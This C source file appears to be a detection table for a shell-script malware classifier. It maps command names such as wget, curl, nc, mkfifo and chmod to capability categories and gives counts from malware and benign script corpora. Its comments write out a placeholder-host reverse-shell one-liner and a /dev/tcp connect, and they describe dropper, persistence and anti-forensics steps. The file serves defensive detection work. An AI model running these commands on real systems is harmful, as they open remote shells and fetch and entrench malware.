/*
 * nucleo_names_sh.c - what a command of a POSIX shell script (sh, bash, busybox ash) means.
 *
 * A shell has no function calls either: what it asks of the system it asks by running a COMMAND, so a row is the command
 * word as the script spells it, at the start of a command - after `;`, `&`, `&&`, `||`, `|`, `(`, `{`, `then`, `do`, `else`,
 * and after `sudo`, `nohup`, `exec`, `time`, `env`, `xargs`, `command`, `setsid`, `busybox` - and never an argument. Case
 * matters (no `fold`). The arguments are the matcher's: `base64 -d` is a decode and `base64` is an encode, `nc -l` listens
 * and `nc host port` connects; where one command is two capabilities by its arguments the table names the one that is not
 * the other's absence and says so below. A bash special file is a row too, spelled as the path up to the host ("/dev/tcp").
 * A request source is an environment variable of CGI, spelled without its `$`.
 *
 * The evidence is 866 malware shell scripts against 2013 benign ones of this machine (system scripts, installers, build
 * scripts), command-position occurrences only, after two corrections: a family of 624 near-identical scripts (a web-server
 * compromise of one telephony product, which put `base64` in 633 of the 1,505 files by itself) is counted out, and 15 files
 * that are Makefiles and C that the language detector took for shell are too. What is left is mostly IoT downloaders, which
 * are `wget`/`tftp`/`chmod` loops over a list of architectures.
 */

#include "nucleo_private.h"

static const struct kgenome_nucleo_namerow rows[] = {
	/*
	 * DECODE: base64 4/2013 benign, 9/866 malware, xxd (xxd -r turns hex back into bytes: 1/2013 benign, 1/866 malware), gunzip
	 * 3/2013 benign, 2/866 malware, rev (a reversed name or a reversed payload: 0/2013 benign, 0/866 malware). With a key:
	 * openssl 7/2013 benign, 13/866 malware, whose enc -d is the decrypt of a staged payload and which is otherwise rare in the
	 * scripts of this machine. [Unverified: uudecode has no occurrence.]
	 */
	{ .name = "base64", .cap = KGENOME_NUCLEO_DECODE },
	{ .name = "xxd", .cap = KGENOME_NUCLEO_DECODE },
	{ .name = "gunzip", .cap = KGENOME_NUCLEO_DECODE },
	{ .name = "uudecode", .cap = KGENOME_NUCLEO_DECODE },
	{ .name = "rev", .cap = KGENOME_NUCLEO_DECODE },
	{ .name = "openssl", .cap = KGENOME_NUCLEO_CRYPTO },
	/*
	 * DYNCALL: "(dynamic)" is a command whose name is an expansion, `$cmd args` or `"$bin"`: a callee that is a value.
	 */
	{ .name = KGENOME_NUCLEO_DYNAMIC_NAME, .cap = KGENOME_NUCLEO_DYNCALL },
	/*
	 * LIB_OPEN: `source file` runs the commands of another file in this shell: the same act as a library load, and the operand
	 * is what makes it a dropper's (source: 26/2013 benign, 3/866 malware; the one row here that is not rare in benign scripts).
	 * The dot form is not a row - `.` is in 529/2013 benign, 19/866 malware.
	 */
	{ .name = "source", .cap = KGENOME_NUCLEO_LIB_OPEN },
	/*
	 * PROCESS: the native word is proc-start for every one of them. A script runs other code by starting an interpreter: bash
	 * 6/2013 benign, 21/866 malware, sh 60/2013 benign, 43/866 malware, busybox 2/2013 benign, 94/866 malware (`busybox wget`,
	 * `busybox tftp` are how an IoT dropper uses the one tool its target has), python 8/2013 benign, 13/866 malware, perl
	 * 10/2013 benign, 10/866 malware, php, ruby, node. `sh -c "text"` is also an eval of the text, which the argument decides;
	 * the weaker word is the process.
	 */
	{ .name = "bash", .cap = KGENOME_NUCLEO_EXEC_IMAGE },
	{ .name = "sh", .cap = KGENOME_NUCLEO_EXEC_IMAGE },
	{ .name = "busybox", .cap = KGENOME_NUCLEO_EXEC_IMAGE },
	{ .name = "python", .cap = KGENOME_NUCLEO_EXEC_IMAGE },
	{ .name = "python3", .cap = KGENOME_NUCLEO_EXEC_IMAGE },
	{ .name = "perl", .cap = KGENOME_NUCLEO_EXEC_IMAGE },
	{ .name = "php", .cap = KGENOME_NUCLEO_EXEC_IMAGE },
	{ .name = "ruby", .cap = KGENOME_NUCLEO_EXEC_IMAGE },
	{ .name = "node", .cap = KGENOME_NUCLEO_EXEC_IMAGE },
	/*
	 * BACKGROUND: a process putting itself out of the reach of the terminal it was started from: nohup 4/2013 benign, 30/866
	 * malware, setsid 0/2013 benign, 3/866 malware, disown 0/2013 benign, 22/866 malware. PIPE: mkfifo makes the named pipe the
	 * Unix reverse shell is built from (`mkfifo /tmp/f; nc host port < /tmp/f | sh > /tmp/f`): 5/2013 benign, 6/866 malware.
	 */
	{ .name = "nohup", .cap = KGENOME_NUCLEO_BACKGROUND },
	{ .name = "setsid", .cap = KGENOME_NUCLEO_BACKGROUND },
	{ .name = "disown", .cap = KGENOME_NUCLEO_BACKGROUND },
	{ .name = "mkfifo", .cap = KGENOME_NUCLEO_PIPE },
	/*
	 * FILE: permissions and the destruction of data. chmod is the step after a download (87/2013 benign, 680/866 malware: the
	 * commonest of the rows here in the malware, the dropper's `chmod 777`, and in one benign script in twenty-three); chown and
	 * chgrp. shred overwrites (0/2013 benign, 4/866 malware), unlink removes. The commands every script uses to create, copy,
	 * move and delete files are left out below.
	 */
	{ .name = "chmod", .cap = KGENOME_NUCLEO_PERM_SET },
	{ .name = "chown", .cap = KGENOME_NUCLEO_PERM_SET },
	{ .name = "chgrp", .cap = KGENOME_NUCLEO_PERM_SET },
	{ .name = "shred", .cap = KGENOME_NUCLEO_FILE_DELETE },
	{ .name = "unlink", .cap = KGENOME_NUCLEO_FILE_DELETE },
	/*
	 * NETWORK: curl 25/2013 benign, 480/866 malware and wget 22/2013 benign, 651/866 malware fetch a URL (the dropper's whole
	 * network half: about one benign script in eighty runs either, and most of the malware here does); nc, ncat, netcat, socat
	 * and telnet connect, ssh, scp, sftp, ftp and tftp are connections that carry a transfer (tftp is how the IoT droppers fetch
	 * when wget is missing: 6/2013 benign, 55/866 malware); zmap scans. /dev/tcp and /dev/udp are bash's own sockets, `exec
	 * 3<>/dev/tcp/host/port`: a connect that needs no tool, written as the path up to the host. DNS: nslookup and dig.
	 * [Unverified: socat, ncat, netcat, dig and the two bash devices have no occurrence in a malware file.]
	 */
	{ .name = "curl", .cap = KGENOME_NUCLEO_HTTP_FETCH },
	{ .name = "wget", .cap = KGENOME_NUCLEO_HTTP_FETCH },
	{ .name = "nc", .cap = KGENOME_NUCLEO_NET_CONNECT },
	{ .name = "ncat", .cap = KGENOME_NUCLEO_NET_CONNECT },
	{ .name = "netcat", .cap = KGENOME_NUCLEO_NET_CONNECT },
	{ .name = "socat", .cap = KGENOME_NUCLEO_NET_CONNECT },
	{ .name = "telnet", .cap = KGENOME_NUCLEO_NET_CONNECT },
	{ .name = "ssh", .cap = KGENOME_NUCLEO_NET_CONNECT },
	{ .name = "scp", .cap = KGENOME_NUCLEO_NET_CONNECT },
	{ .name = "sftp", .cap = KGENOME_NUCLEO_NET_CONNECT },
	{ .name = "ftp", .cap = KGENOME_NUCLEO_NET_CONNECT },
	{ .name = "tftp", .cap = KGENOME_NUCLEO_NET_CONNECT },
	{ .name = "/dev/tcp", .cap = KGENOME_NUCLEO_NET_CONNECT },
	{ .name = "/dev/udp", .cap = KGENOME_NUCLEO_NET_CONNECT },
	{ .name = "zmap", .cap = KGENOME_NUCLEO_NET_CONNECT },
	{ .name = "nslookup", .cap = KGENOME_NUCLEO_DNS },
	{ .name = "dig", .cap = KGENOME_NUCLEO_DNS },
	/*
	 * REQUEST: what the sender of a CGI request chose, which a shell script reads from the environment the web server sets.
	 * [Unverified: no occurrence in either set; the three are what a CGI shell and the shellshock requests use.]
	 */
	{ .name = "QUERY_STRING", .cap = KGENOME_NUCLEO_REQUEST },
	{ .name = "HTTP_COOKIE", .cap = KGENOME_NUCLEO_REQUEST },
	{ .name = "HTTP_USER_AGENT", .cap = KGENOME_NUCLEO_REQUEST },
	/*
	 * LEFT OUT, because the name is not the evidence, with the command-position counts over the 866 malware / 2013 benign
	 * scripts: eval 222/2013 benign, 19/866 malware (the shell's own way to build a command, in about one benign script in nine;
	 * `sh -c` is the process row instead), exec 155/2013 benign, 33/866 malware, awk 175/2013 benign, 33/866 malware, sleep
	 * 280/2013 benign, 69/866 malware (a wait is how every poll loop works), echo 1301/2013 benign, 273/866 malware, cd, exit,
	 * export, set, unset, trap, read, printf; rm 512/2013 benign, 592/866 malware, mv 118/2013 benign, 58/866 malware, cp
	 * 153/2013 benign, 85/866 malware, mkdir 236/2013 benign, 121/866 malware, touch 119/2013 benign, 29/866 malware, cat
	 * 330/2013 benign, 162/866 malware, tee 13/2013 benign, 4/866 malware, ln, install, find, dd (what a shell script does on
	 * every line; PHP's fread and mkdir are out for the same reason); tar 44/2013 benign, 9/866 malware, gzip, zcat, unzip,
	 * bzip2, xz (archive handling is what an installer does), tr 85/2013 benign, 32/866 malware; sudo 45/2013 benign, 5/866
	 * malware, su 2/2013 benign, 3/866 malware, kill 96/2013 benign, 93/866 malware, pkill 0/2013 benign, 20/866 malware,
	 * killall, ps, id, uname 36/2013 benign, 74/866 malware, hostname, whoami, ifconfig, ip (host identity and process control);
	 * host 2/2013 benign, 0/866 malware, getent 3/2013 benign, 0/866 malware, ping 19/2013 benign, 0/866 malware; systemctl,
	 * service, mount, insmod, rmmod (the verb is in the argument: systemctl enable installs a service and systemctl status does
	 * not); `$1`, `$0`, `$@` and read (the arguments of a script are not a request). NOT NAMED because the vocabulary has no
	 * word, each of them in the malware here: chattr +i (1/2013 benign, 32/866 malware: making the dropped file impossible to
	 * remove), crontab (11/2013 benign, 38/866 malware: persistence), iptables and ufw (the firewall), useradd, usermod, passwd
	 * and chpasswd (accounts), ssh-keygen and authorized_keys (a key for later), history -c and unset HISTFILE (anti-forensics),
	 * ulimit, setenforce, and kill/pkill of a competing miner or bot.
	 */
};

const struct kgenome_nucleo_names kgenome_nucleo_names_sh = {
	.target = KGENOME_NUCLEO_T_SH, .fold = 0, .row = rows, .n = sizeof rows / sizeof rows[0]
};
